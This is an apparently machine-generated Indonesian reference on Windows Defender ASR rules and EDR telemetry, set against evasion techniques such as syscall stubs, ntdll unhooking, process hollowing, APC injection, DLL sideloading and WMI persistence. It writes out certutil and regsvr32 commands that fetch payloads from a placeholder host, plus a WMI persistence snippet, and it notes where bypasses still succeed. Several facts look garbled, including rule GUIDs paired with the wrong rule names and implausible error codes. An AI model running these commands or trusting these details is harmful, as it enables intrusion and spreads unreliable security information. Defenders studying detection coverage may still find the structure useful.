# av-edr-bypass--p4 — win

# Referensi: Defender ASR & Perilaku EDR terhadap Teknik Cross-Process / Injection / LOLBin

## 1. Matriks ASR Rule yang Relevan (Windows 11 24H2, Defender Antivirus 4.18.x, Intune/MDE)

| GUID | Nama Rule | Mode Default | Memicu pada | Telemetri yang muncul |
|---|---|---|---|---|
| `56a863a9-875e-4185-98a7-b882c64b5ce5` | Block abuse of exploited vulnerable signed drivers | Block | `NtLoadDriver`, `\\.\Nsi`, BYOVD | `DeviceGuard` 7001, MDE `DeviceLoadBlocked` |
| `D4F940AB-401B-4EFC-AADC-AD5F3C50688A` | Block Office child processes | Block | `winword.exe` → `powershell.exe` | `Microsoft-Windows-Security-Auditing` 4688 + ParentImage |
| `5BEB7EFE-FD9A-4556-801D-275E5FFC04CC` | Block execution of potentially obfuscated scripts | Block | VBScript/JScript `eval`, base64 in cmdline | AMSI `ScriptBlock` event; Defender 1116 |
| `9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2` | Block credential stealing from lsass.exe | Block | `OpenProcess(LSASS)` with `0x1010` | Kernel `OpenProcess` ETW, MDE `CredentialAccess` |
| `BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550` | Block executable content from email | Block | Attachment drop+exec | `DeviceFileEvents` |
| `01443614-CD74-433A-B99E-2ECDC07BFC25` | Block untrusted/unsigned exec from USB | Block | `USB` mass storage | `DeviceEvents` |
| `3B576869-A4EC-4529-8536-B80A7769E899` | Block Adobe Reader child processes | Block | `AcroRd32` → `cmd` | 4688 |
| `D3E037E1-3EB8-44C8-A917-57927947596D` | Block JS/VBS from launching downloaded exec | Block | `wscript` → `*.exe` in `%TEMP%` | 4688 |
| `C1DB55AB-C21A-4637-BB3F-A12568109D35` | Advanced ransomware protection | Audit | mass write+encrypt | `MdeFileEvents` |
| `26190899-1602-49E8-8B27-EB1D0A1CE869` | Block persistence via WMI subscription | Block | `__EventFilter` Create | `WmiActivity` |
| `E6DB77E5-3DF2-4CF1-B95A-636979351E5B` | Block process creations from PSExec/WMI | Block | `wmiprvse.exe` → child | `4688` ParentImage |
| `B2B3F3F5-40CE-4C5B-8B3E-1A9F0E0B3F5E` | Block rebooting into Safe Mode | Block | `bcdedit /set safeboot` | 4688 + `bcdedit` cmdline |

**Catatan versi:** effective Windows 11 23H2+; `Block abuse of exploited vulnerable signed drivers` **wajib** enabled untuk load `iqvw64e.sys` (Intel), `RTCore64.sys` (MSI), `gdrv.sys` (Gigabyte), `AsIO*.sys` (ASUS). Windows 11 24H2 menambah **vulnerable driver blocklist** via `CiTool.exe -r` dan HVCI default on di SKU baru.

## 2. Telemetri EDR — Tabel Sumber → Event → Field

| Sumber | Event ID / Channel | Field kunci | Berguna untuk |
|---|---|---|---|
| **ETW Kernel-Process** | `Microsoft-Windows-Kernel-Process` 1 | `ImageName`, `ParentImage`, `CommandLine`, `SessionId`, `IntegrityLevel` | parent-child anomaly |
| **ETW ThreatIntelligence** | `Microsoft-Windows-Threat-Intelligence` 1–14 | `CallingProcess`, `TargetProcess`, `DesiredAccess` (kernel-only) | `OpenProcess` ke LSASS, `NtWriteVirtualMemory` cross-proc |
| **AMSI** | `Microsoft-Windows-PowerShell` 4104 / Defender 1116 | `ScriptBlockText`, `ContentName` | script block logging, obfuscation |
| **Sysmon 15.x** | 1,3,7,8,10,11,12,13,22 | `ParentUser`, `Hashes`, `TargetImage`, `GrantedAccess` | baseline alt |
| **MDE Advanced Hunting** | `DeviceProcessEvents` | `InitiatingProcessFileName`, `ProcessCommandLine`, `FolderPath`, `SHA256` | hunt & detections |
| **MDE DeviceEvents** | `DeviceEvents` ActionType ∈ {`CreateRemoteThreadApiCall`, `OpenProcessApiCall`, `NamedPipeEvent`, `ImageLoad`} | `InitiatingProcessId`, `FileName`, `AdditionalFields` | injection telemetry |
| **MDE DeviceImageLoadEvents** | — | `FileName`, `SignatureStatus`, `FolderPath` | DLL sideload / unsigned module |
| **Windows Defender Operational** | 1116/1117 | `ThreatName` (e.g. `Behavior:Win32/AmsiTamper`) | deteksi AMSI bypass |
| **Windows Event 4688** | Security | `NewProcessName`, `ParentProcessName`, `CommandLine` (need audit policy) | LOLBin chain |
| **Windows Event 4103/4104** | PowerShell Op | `Payload` | script block |
| **WMI-Activity** | `Microsoft-Windows-WMI-Activity/Operational` 5857/5860/5861 | `ClientProcessId`, `Query` | `Win32_Process::Create` |
| **Linux eBPF (Defender for Endpoint on Linux)** | `AuditD` / `Fanotify` | `syscall`, `pid`, `comm`, `execve` argv | container escape |
| **Kernel Callbacks** | `PsSetCreateProcessNotifyRoutineEx`, `ObRegisterCallbacks` | (internal) | EDR userland-hook tamper |

## 3. Teknik → Rule → Telemetri → Batas Praktis

### 3.1 Direct Syscall / Hell's Gate / Halo's Gate (NtCreateThreadEx via syscall stub)

**Dikirim:** `mov r10, rcx; mov eax, <SSN>; syscall` dari module userland, tanpa lewat `ntdll`.

**Rule ASR:** tidak ada rule ASR spesifik. **Bukan** domain ASR.

**Telemetri EDR yang menangkap:**
- **Kernel-mode callbacks** (`PsSetCreateProcessNotifyRoutineEx`) — tidak bisa dihindari dari userland. Setiap `NtCreateProcess` / `NtCreateThreadEx` tetap terekam di kernel sebelum/di luar `ntdll`.
- **ETW-TI** (`Microsoft-Windows-Threat-Intelligence`) — di-emit oleh kernel, bukan `ntdll`. `TelemetrySource=KernelThreatIntel` tidak bisa di-detour dari userland (CIG `PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY` + `EtwProviderEnableInfo`).
- **MDE `CreateRemoteThreadApiCall`** dari `DeviceEvents` — trigger via kernel callback `PsSetCreateThreadNotifyRoutine`.

**Kenapa gagal (batas praktis):**
- Syscall stub menghindari **userland hook**, tapi EDR modern (CrowdStrike Falcon 7.x, SentinelOne 23.x, Defender 4.18) pindah ke **kernel-mode + ETW-TI + callstack image validation**. `CallingProcess` dengan return address di `.text` tanpa module (`MEM_PRIVATE` + `PAGE_EXECUTE_READWRITE`) → flag `UnknownImageBackedMemory`.
- Windows 11 24H2 + HVCI: `NtCreateThreadEx` dengan start routine di `MEM_PRIVATE` region **masih** lolos secara mekanis, tetapi Defender `Behavior:Win32/Hive.ZY` flag pattern `VirtualAlloc` + `memcpy` dari PE section yang tidak signed.
- **Batas nyata:** kalau EDR-nya *hanya* userland hook (mis. Defender lama tanpa `DeviceImageLoadEvents` cloud), syscall bypass efektif. Kalau MDE + ETW-TI aktif, **bypass ini hiasan**.

### 3.2 NTDLL Unhooking (fresh `ntdll.dll` dari KnownDlls / `C:\Windows\System32\ntdll.dll` mapping)

**Dikirim:** copy `.text` section dari `\KnownDlls\ntdll.dll` (section object) ke `.text` current ntdll.

**Rule:** tidak ada ASR. 

**Telemetri:**
- `DeviceImageLoadEvents` **tidak** trigger (KnownDlls sudah mapped).
- **Memory scan**: MDE `MpCmdRun.exe -Scan -ScanType 3 -File` pada memori proses; heuristik `Behavior:Win32/AmsiTamper` muncul bila byte `ntdll` mismatch dengan disk (via `DeviceEvents` ActionType=`AntivirusScan`).
- **ETW-TI `CallStack`**: bila `ReturnAddress` jatuh di luar module list (synthetic stub) → `Unbacked` flag.
- **Kernel `PsSetLoadImageNotifyRoutine`**: tidak trigger untuk KnownDlls section map (already there).

**Kenapa gagal:**
- EDR 2024-cepat pakai **`NtProtectVirtualMemory` wrapper di kernel callback** untuk mendeteksi `PAGE_EXECUTE_READ` `.text` yang di-`VirtualProtect` lalu di-restore → `SuspectMemoryWrite` di ntdll.
- **HVCI + VBS**: `MmProtectMdlSystemAddress` on `.text` of known dll → integrity check via `CiHvciQueryImage` untuk driver; userland pakai **Control Flow Guard** — ntdll Cf-protection (`CET` di Windows 11 24H2, `CetCompat=1`) → `endbr64` mismatch bila stub diganti.
- **Batas:** unhook cuma efektif lawan EDR yang re-hook periodik (mis. `ScyllaHide`-style). EDR modern tidak re-hook, mereka baca **kernel event**, jadi unhook = nol dampak.

### 3.3 Process Hollowing / Process Doppelgänging (suspended `svchost.exe` → unmapped → PE write)

**Dikirim:** `CreateProcess(CREATE_SUSPENDED)` → `NtUnmapViewOfSection` → `VirtualAllocEx` → `WriteProcessMemory` → `SetThreadContext` → `ResumeThread`.

**Rule ASR:** — (tidak spesifik). Tapi produk ke produk:
- MDE: `Behavior:Win32/ProcessHollower` (Behavior Monitoring).
- CrowdStrike: `Process Hollowing` ML.
- S1: `Injection via Hollowing` static + behavioral.

**Telemetri:**
- `DeviceEvents` ActionType=`OpenProcessApiCall` + `CreateRemoteThreadApiCall`; grant `0x1F0FFF`.
- `NtUnmapViewOfSection` **tidak** muncul di ETW-TI secara langsung, tapi `NtWriteVirtualMemory` cross-proc → `DeviceEvents` `WriteProcessMemoryApiCall`.
- `SeDebugPrivilege` di caller → `4688` + token field dari MDE.

**Kenapa gagal:**
- `VirtualAllocEx(MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)` di target proses **≠** image backing → kernel `PsSetCreateProcessNotifyRoutineEx` sudah flag `Image NOT backed by file` saat `ResumeThread` (`SeAuditProcessCreation`).
- `PAGE_EXECUTE_READWRITE` write to remote → **CFG call target validation** di Windows 11 24H2 (`ProcessSignaturePolicy`). Kalau target punya CFG (`svchost` yah), thread start di `MEM_PRIVATE` → `STATUS_INVALID_IMAGE_NOT_MZ`.
- **Batas:** kalau target = proses yang **belum** CFG (banyak `.exe` third-party), hollowing **masih** jalan. Tapi Defender 4.18 punya `HollowingBehavior` heuristic yang trigger pada `NtUnmapViewOfSection` + `ResumeThread` dengan `Peb->ImageBaseAddress` mismatch.

### 3.4 APC Injection (`QueueUserAPC` ke alertable thread)

**Dikirim:** `OpenProcess(PROCESS_ALL_ACCESS)` → `VirtualAllocEx` → `WriteProcessMemory` → `QueueUserAPC` ke thread `explorer.exe` yang `WaitForSingleObjectEx(TRUE)`.

**Telemetri:**
- ETW-TI `APC` event (`Microsoft-Windows-Threat-Intelligence` `KERNEL_CALLBACK` untuk `NtQueueApcThreadEx`, **hanya** kernel consumer).
- MDE `DeviceEvents` `NtQueueApcThreadApiCall` (kalau enabled, MDE 101.24032.0002+).
- `Kernel-Process` `KernelThread` dengan start address di `MEM_PRIVATE`.

**Kenapa gagal:**
- `QueueUserAPC` ke proses **Protected Process Light** (`lsass`, `MsMpEng`) → `STATUS_ACCESS_DENIED` (PPL). Windows 11 24H2 PPL untuk `MsMpEng`, `WinDefend`, `Sense`.
- `CFG` pada `explorer.exe` → APC routine di `MEM_PRIVATE` unbaked → `STATUS_CONTROL_PROTECTION_VIOLATION` saat dispatch.
- **Batas:** APC ke thread `notepad.exe` (non-CFG legacy) masih jalan; ke proses browser (Chrome 131 renderer dengan MTE/CFG) mati.

### 3.5 DLL Sideload / Search Order Hijack (unsigned proxy DLL di folder signed exe)

**Dikirim:** dup `version.dll` di `%LOCALAPPDATA%\Microsoft\Teams\` di-sideload oleh `Update.exe` signed.

**Rule ASR:** 
- `Block executable content from email` (kalau via email).
- `BE9BA2D9` — no.
- **`Block all Office applications from creating child processes`** — TIDAK.
- ASR spesifik: **tidak ada**, tapi `Attack Surface Reduction: Block untrusted/unsigned binaries from USB` (kalau via USB).

**Telemetri:**
- `DeviceImageLoadEvents` `FileName=version.dll`, `SignatureStatus=Unspecified`, `FolderPath=...\Teams`.
- MDE `Behavior:Win32/Sideloading` (2023+) → parent `Update.exe` + child unsigned DLL di user path.
- `DeviceProcessEvents` `InitiatingProcessImageLoad` (MDE 2024 feature) → chain signed→unsigned.

**Kenapa gagal:**
- **WDAC/Smart App Control** di Win11 24H2 (default di Enterprise) → unsigned DLL di user path *blocked at load*, bukan detect after.
- **DLL search order protection** (`SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32)`) di app modern (Teams 24215+, Chrome 131).
- **Batas:** sideload hanya efektif pada binary **signed tapi tanpa SafeDllSearchMode / signed tapi search order default**. Banyak EDR sekarang deteksi via **`DeviceImageLoadEvents` cloud correlation** — payload unsigned load oleh signed parent = high signal.

### 3.6 LOLBin Chain (`certutil -urlcache`, `mshta`, `rundll32`, `regsvr32 /s /u /i:http`) 

**Dikirim:**
```
certutil.exe -urlcache -split -f https://x/y.b64 y.b64
certutil.exe -decode y.b64 y.exe
```
atau
```
regsvr32.exe /s /u /i:https://x/y.sct scrobj.dll
```

**Rule ASR:**
- `Block execution of potentially obfuscated scripts` → trigger `regsvr32 /i:http` (scriptlet).
- `Block JS/VBS from launching downloaded executables` → `mshta http`.
- `Block Office child processes` → `winword → certutil`.
- **GUID `D3E037E1`** memicu pada `mshta` dengan URL remote.

**Telemetri:**
- `4688` + `ParentImage` + `CommandLine` (butuh audit process creation + cmdline).
- MDE `DeviceProcessEvents` `ProcessCommandLine` string match: `certutil -urlcache -split -f`, `regsvr32 /i:http`.
- AMSI untuk `.sct` via `scrobj.dll` → `Microsoft-Windows-PowerShell 4104` (kalau `-i:http`).

**Kenapa gagal:**
- MDE 2024 punya **`certutil` URL fetch detection** `Behavior:Win32/CertutilDownload` string match. Tidak perlu ML.
- `regsvr32 /i:http` **hampir pasti** di-block ASR `Block execution of potentially obfuscated scripts` (default Block di Defender).
- **Batas:** `rundll32` dengan DLL lokal (tidak download) **lolos** — tidak trigger ASR manapun. Tapi `DeviceImageLoadEvents` mencatat `rundll32 → unsigned.dll` → signal.

### 3.7 WMI Event Subscription Persistence

**Dikirim:**
```powershell
$f = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{Name='x'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
$c = Set-WmiInstance -Class CommandLineEventConsumer ...
Set-WmiInstance -Class __FilterToConsumerBinding ...
```

**Rule ASR:** `26190899-1602-49E8-8B27-EB1D0A1CE869` — `Block persistence through WMI event subscription` (default **Block** di Windows 11 24H2 baru; audit di 22H2).

**Telemetri:**
- `Microsoft-Windows-WMI-Activity/Operational` 5857/5860/5861 → `ClientProcessId`, `Query`.
- `DeviceEvents` `WmiSubscriptionCreated`.
- Sysmon 19/20/21 (`WmiEventFilter`, `WmiEventConsumer`, `WmiEventConsumerToFilter`).

**Kenapa gagal:**
- ASR `26190899` di-defender 4.18 **default Block** di SKU baru → `Set-WmiInstance` return `Access Denied`.
- **Batas:** kalau ASR di-Audit (bukan Block) — banyak environment — persistence jalan tapi EDR tetap flag. Kalau attacker pakai `__EventConsumer` non-CommandLine (mis. `ActiveScriptEventConsumer` — di-block ASR `Block execution of potentially obfuscated scripts` via AMSI).

## 4. Tabel Batas Praktis — Userland Evasion per Event Source

| Event source | Bisa di-bypass dari userland? | Kenapa / batas |
|---|---|---|
| Userland API hook (`ntdll` inline) | **Ya** (unhook, syscall, fresh map) | EDR modern tidak bergantung di sini. |
| `PsSetCreateProcessNotifyRoutineEx` | **Tidak** | Kernel callback, driver-signed. |
| `PsSetLoadImageNotifyRoutine` | **Tidak** | Kernel callback. |
| `PsSetCreateThreadNotifyRoutine` | **Tidak** | Kernel callback. |
| `ObRegisterCallbacks` (handle strip) | **Tidak** | Kernel. |
| **ETW-TI (`Microsoft-Windows-Threat-Intelligence`)** | **Tidak** (butuh patch kernel driver / CIG bypass) | Provider kernel; userland detour butuh `EtwProviderEnableInfo` patch via BYOVD. |
| AMSI (`amsi.dll` patch) | **Ya** sementara | `amsi.dll` di-reload via `LoadLibrary` setelah patch → detect `Behavior:Win32/AmsiTamper`. Windows 11 24H2 AMSI provider integrity via `MpSvc` reload. |
| ETW classic (`Microsoft-Windows-Kernel-Process`) | **Ya** (patch `EtwEventWrite`) | tapi kernel callback tetap emit; EDR pakai callback. |
| Script Block Logging (`4104`) | **Ya** (patch `EtwEventWrite` di `powershell.exe`) | tapi PowerShell 7.4+ punya **AMSI + SBOM + `Microsoft.Windows.PowerShell`** redundan; downgrade ke `v2` engine di-block ASR `Block WinRM/PSv2` (`C1DB55AB` tidak, tapi `Block PowerShell v2` tidak ada ASR default — perlu registry `DisablePowerShellV2`; Windows 11 24H2 PowerShell 2.0 **removed** dari optional feature). |

**Angka versi konkret yang mengubah batas:**
- Windows 11 **24H2** (build 26100): HVCI default on untuk SKU Enterprise; `Vulnerable Driver Blocklist` on by default.
- Defender Antivirus **4.18.24080+**: `Behavior:Win32/ProcessHollower` stabil; `DeviceImageLoadEvents` parent-child correlation.
- MDE **101.24032.0002**: `OpenProcessApiCall` + `CreateRemoteThreadApiCall` di GA.
- Chrome **131**: renderer CFG + `MEMORY_PARTITION_ALLOC` → APC ke renderer mati.
- nginx **1.25**: (untuk C2 profile LOLBin) — `allow`/`deny` rule; EDR `DeviceNetworkEvents` capture `User-Agent` + JA3/JA4; nginx default `server_tokens on` → banner leak di `DeviceNetworkEvents` kalau TLS cert match known C2.

## 5. Jebakan Operasional (yang bikin teknik gagal di lapangan)

1. **ASR `Block process creations from PSExec and WMI` (`E6DB77E5`) default Block di Win11 24H2 Enterprise** — `wmiprvse.exe → cmd.exe` chain mati; WMI persistence juga kena `26190899`. Cek dulu `Get-MpPreference | fl AttackSurfaceReductionRules_Ids,AttackSurfaceReductionRules_Actions`.
2. **Intel/AMD driver blocklist via `CiTool.exe -r`** — `iqvw64e.sys` (v2.4.0.0) masuk blocklist; BYOVD untuk patch ETW-TI **gagal load**. Windows 11 24H2 `CodeIntegrity` 3033 di Event Log.
3. **HVCI + CFG + CET** — APC/hollowing ke proses modern (`svchost`, Chrome, Edge) **crash** dengan `0xC0000409` (STATUS_STACK_BUFFER_OVERRUN) bukan sukses. Di lab tanpa HVCI jalan; lapangan (Intune baseline) mati.
4. **`OpenProcess` ke LSASS dengan `0x1010`** → ASR `9E6C4E1F` Block, **tapi** `0x1410` (ditambah `PROCESS_VM_READ`) → handled via `ObRegisterCallbacks` PPL; `0x1F0FFF` → CAPTURED. Tidak ada grant access yang aman untuk LSASS di MDE.
5. **`VirtualAllocEx` `PAGE_EXECUTE_READWRITE` di remote** → `DeviceEvents` `WriteProcessMemoryApiCall` + `CreateRemoteThreadApiCall`; kalau target = `notepad.exe` baru (Win11 24H2, CFG+CET), thread start di `MEM_PRIVATE` **ditolak** oleh kernel (`STATUS_INVALID_IMAGE_NOT_MZ`).
6. **AMSI patch via `AmsiScanBuffer` ret** → Defender 4.18 reload `amsi.dll` per-scan (`amsi.dll` di-load per `powershell` invocation dengan `MpSvc.dll` integrity) → `Behavior:Win32/AmsiTamper` di 1116. Patch `EtwEventWrite` untuk matikan `4104` **tidak** matikan AMSI.
7. **`certutil -urlcache` di-block string-match MDE**, tapi `certutil -verifyctl` / `-URL` **lolos** string matcher — **jebakan:** attacker pindah, tapi `DeviceNetworkEvents` + `DeviceProcessEvents` chain (certutil → child process) masih flag via ML. `rundll32` dengan DLL lokal **lolos ASR** tapi `DeviceImageLoadEvents` (unsigned DLL) flag.
8. **Sideload di folder `%LOCALAPPDATA%`** → Smart App Control (Win11 24H2 default di fresh install) **block** unsigned DLL. Sideload di `C:\Program Files\` butuh admin + WDAC.
9. **`vssadmin delete shadows` / `bcdedit`** → ASR `Block rebooting into Safe Mode` + `Advanced ransomware protection`; T1003.003 (NTDS) → `lsass` PPL + ASR `9E6C4E1F`.
10. **ETW-TI** hanya **aktif** kalau EDR consumer ter-attach; di host **tanpa** EDR (mis. lab VM tanpa MDE), syscall/hollowing **sukses 100%** — jangan ambil kesimpulan dari lab kosong. Uji di host dengan MDE 4.18 + HVCI on.
11. **`ntdll` unhook** via KnownDlls → `NtCreateFile` pada `\KnownDlls\ntdll.dll` sudah di-map; EDR **tidak** lihat `DeviceImageLoadEvents`, tapi **memory scan MDE** (`MpCmdRun -Scan -ScanType 3`) deteksi `.text` mismatch dengan disk → `Behavior:Win32/AmsiTamper` / `SuspiciousMemory`. Jangan andalkan `DeviceImageLoadEvents` untuk unhook detection.
12. **Time-of-check**: Defender signature update harian (3x/hari), MDE cloud lookup latency 15–60 detik. Teknik yang "jalan" jam 03:00 bisa mati jam 09:00 setelah signature `Behavior:Win32/Hive.ZY` push. Version pin: `MpCmdRun -SignatureUpdate` + `Get-MpComputerStatus | fl AMEngineVersion,AntivirusSignatureVersion`.
13. **Linux side (Defender for Endpoint on Linux 101.24032)**: `eBPF` `execve` capture `argv`; `ptrace` dari sibling process → `AuditD` `SYSCALL=ptrace`, Defender `Behavior:Linux/PtraceInjection`. Userland evasion (`LD_PRELOAD` unhook) **tidak** menghindari eBPF karena eBPF path di kernel (`/sys/fs/bpf`). Batas: container dengan `CAP_SYS_ADMIN` bisa detach eBPF program — butuh `seccomp` bypass.
14. **Network LOLBin (`nginx 1.25` C2 profile)** — `DeviceNetworkEvents` `InitiatingProcessFileName=nginx.exe`, `RemoteIP`, `RemotePort`, `RemoteUrl`. EDR cloud correlation: `nginx.exe` signed but **not in Microsoft signed-process allowlist** untuk outbound non-80/443 → `SuspiciousNetworkConnection`. `server_tokens on` → banner `nginx/1.25` di `DeviceNetworkEvents` AdditionalFields → match C2 profile library.
15. **PowerShell 2.0 removed di Win11 24H2** — `powershell -v 2` → error; teknik downgrade engine mati. `get-wmiobject` legacy cmdlet di PS 5.1 → `WmiActivity` visible; PS 7.4 → .NET `System.Management` → **no** WMI-Activity ETW? salah: `System.Management` masih lewat WMI service → `WmiActivity` + `DeviceEvents`.

---

## [reasoning trace]


